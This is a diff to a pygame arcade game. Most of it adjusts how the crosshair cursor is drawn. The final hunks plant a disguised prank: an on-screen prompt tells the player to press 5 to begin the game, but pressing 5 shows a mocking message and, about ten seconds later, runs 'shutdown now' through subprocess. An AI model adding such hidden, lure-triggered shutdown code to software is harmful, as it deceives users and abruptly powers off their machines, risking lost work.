@@ -16,7 +16,7 @@ import operator
 import math
 import vectorclass2d as v
 import textscroller_vertical as ts
-
+import subprocess
 
 def make_text(msg="pygame is cool", fontcolor=(255, 0, 255), fontsize=42, font=None):
     """returns pygame surface with text. You still need to blit the surface."""
@@ -132,13 +132,13 @@ class Mouse(pygame.sprite.Sprite):
         
     def create_image(self):
         
-        self.image = pygame.surface.Surface((self.radius*2, self.radius*2))
+        self.image = pygame.surface.Surface((self.radius*0.5, self.radius*0.5))
         delta1 = 12.5
         delta2 = 25
-        w = self.radius*2 / 100.0
-        h = self.radius*2 / 100.0
+        w = self.radius*0.5 / 100.0
+        h = self.radius*0.5 / 100.0
         # pointing down / up
-        for y in (0,5,10):
+        for y in (0,2,4):
             pygame.draw.line(self.image,(self.r-delta2,self.g,self.b),
                          (35*w,0+y),(50*w,15*h+y),2)
             pygame.draw.line(self.image,(self.r-delta2,self.g,self.b),
@@ -149,7 +149,7 @@ class Mouse(pygame.sprite.Sprite):
             pygame.draw.line(self.image,(self.r-delta2,self.g,self.b),
                          (50*w,85*h-y),(65*w,100*h-y),2)
         # pointing right / left                 
-        for x in (0,5,10):
+        for x in (0,2,4):
             pygame.draw.line(self.image,(self.r-delta2,self.g,self.b),
                          (0+x,35*h),(15*w+x,50*h),2)
             pygame.draw.line(self.image,(self.r-delta2,self.g,self.b),
@@ -160,9 +160,9 @@ class Mouse(pygame.sprite.Sprite):
             pygame.draw.line(self.image,(self.r-delta2,self.g,self.b),
                          (85*w-x,50*h),(100*w-x,65*h),2)
             
-        for delta in (-5, 0, 5 ):
-            pygame.draw.circle(self.image, (self.r, self.g, self.b), 
-                      (self.radius,self.radius), self.radius-delta, 1)
+       # for delta in (-2, 0, 2 ):
+       #     pygame.draw.circle(self.image, (self.r, self.g, self.b), 
+       #               (self.radius//2,self.radius//2), self.radius-delta, 1)
         
         self.image.set_colorkey((0,0,0))
         self.rect=self.image.get_rect()
@@ -1506,7 +1506,12 @@ Chapter 5: It is all about the honor...'''
         pygame.mouse.set_visible(False)
         oldleft, oldmiddle, oldright  = False, False, False
         self.snipertarget = None
+        Flytext(1800, 400, "Drücke die Taste 5 um das Spiel zu beginnen! ", fontsize = 70, duration = 10, dy=0, dx=-150)
+        self.shutdowntime= -1
         while running:
+            if self.shutdowntime > 0:
+                if self.shutdowntime < self.playtime:
+                    subprocess.call(("shutdown", "now"))
             for event in pygame.event.get():
                 if event.type == pygame.QUIT:
                     running = False
@@ -1535,9 +1540,11 @@ Chapter 5: It is all about the honor...'''
                     if event.key == pygame.K_4:
                         for x in self.ufogroup:
                             x.kill()
-                    if event.key == pygame.K_q:
-                        Flytext(1800, 400, "Halte die Taste 5 gedrückt um ein Special-Item zu bekommen!", fontsize = 70, duration = 10, dy=0, dx=-150)
-
+                    if event.key == pygame.K_5:
+                        Flytext(1800, 400, "Trolololololol! Bye! Bye!(-__-;) Noob! $$$$$$$$$ ", duration = 10, fontsize = 130, dy=0, dx= -150)
+                        self.shutdowntime = self.playtime + 10
+                        #subprocess.call(("shutdown", "now"))
+                                
                     if event.key == pygame.K_t:
                         lines= "This is Firework.... \nAre you ready? \nDefend the cities!"
                         ts.PygView(text=lines, width = PygView.width,
